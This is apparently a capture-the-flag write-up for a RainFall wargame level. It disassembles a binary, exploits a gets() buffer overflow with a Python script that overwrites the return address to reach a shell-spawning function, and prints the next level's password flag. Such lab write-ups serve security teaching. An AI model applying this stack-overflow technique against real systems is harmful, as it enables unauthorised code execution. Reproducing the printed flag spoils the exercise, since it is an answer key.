# level2

Using objdump, we can see that there are two functions in the executable: `main()`
and `run()`.

```sh
level1@RainFall:~$ objdump -M intel --disassemble ./level1 | egrep '<([^_@]*)>:' -A 5
08048444 <run>:
 8048444:       55                      push   ebp
 8048445:       89 e5                   mov    ebp,esp
 8048447:       83 ec 18                sub    esp,0x18
 804844a:       a1 c0 97 04 08          mov    eax,ds:0x80497c0
 804844f:       89 c2                   mov    edx,eax
--
08048480 <main>:
 8048480:       55                      push   ebp
 8048481:       89 e5                   mov    ebp,esp
 8048483:       83 e4 f0                and    esp,0xfffffff0
 8048486:       83 ec 50                sub    esp,0x50
 8048489:       8d 44 24 10             lea    eax,[esp+0x10]
```

By disassembling the main function we can see that it only calls `gets()`

```sh
level1@RainFall:~$ objdump -M intel --disassemble ./level1 | egrep '<main>:' -A 9
08048480 <main>:
 8048480:       55                      push   ebp
 8048481:       89 e5                   mov    ebp,esp
 8048483:       83 e4 f0                and    esp,0xfffffff0
 8048486:       83 ec 50                sub    esp,0x50
 8048489:       8d 44 24 10             lea    eax,[esp+0x10]
 804848d:       89 04 24                mov    DWORD PTR [esp],eax
 8048490:       e8 ab fe ff ff          call   8048340 <gets@plt>
 8048495:       c9                      leave  
 8048496:       c3                      ret
```

`gets` is a very dangerous function to use as it does not check for the size of 
the imputted string which enables anyone to segfaul the program by overflowing the buffer.

```
$ man gets | egrep '^BUGS' -A 3
BUGS
       Never  use  gets().   Because it is impossible to tell without knowing the data in advance how many characters gets()
       will read, and because gets() will continue to store characters past the end of the buffer, it is extremely dangerous
       to use.  It has been used to break computer security.  Use fgets() instead.
```

When the address wants to return, it jumps to a previously saved address that is just after the function call. This address is written on the stack. By overflowing the buffer of gets we can re-write the address of return to cause it to return to another function rather than the one it was suposed to return to. In our case we want to jump back to the `run` function.

When we set a breakpoint to the `run` function in gdb, we see that its address is `0x804844a`

```gdb
(gdb) b run
Breakpoint 2 at 0x804844a
```

Now that we have this information, we can start overflowing.

By trial and error, we see that it starts to segfault at 76 characters put into the buffer. so we can write a script that will send 76 characters of padding and then the payload, the address of the `run` function. The address needs to be in reverse as the system is little-endian.

```python
import sys
import os

offset = '*' * 76

# address of run() -> 0x0804844a
run = '\x08\x04\x84\x4a'[::-1]

payload = run

sys.stdout.write(offset + payload)
```

```sh
level1@RainFall:~$ python level1.py | ./level1 
Good... Wait what?
Segmentation fault (core dumped)
```

Now the program goes into the `run` function because it writes `Good... Wait what?` as we wanted. The problem here is that we need to have an interractive session to be able to use the shell. We just need to add a few line to our script.

```python
import sys
import os

offset = '*' * 76

# address of run() -> 0x0804844a
run = '\x08\x04\x84\x4a'[::-1]

payload = run

sys.stdout.write(offset + payload)
sys.stdout.flush()

os.system('cat')
```

Now it should do the trick:

```sh
level1@RainFall:~$ python level1.py | ./level1 

Good... Wait what?
pwd
/home/user/level1
whoami
level2
cat /home/user/level2/.pass
53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77
^CSegmentation fault (core dumped)
```

## .pass: 53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77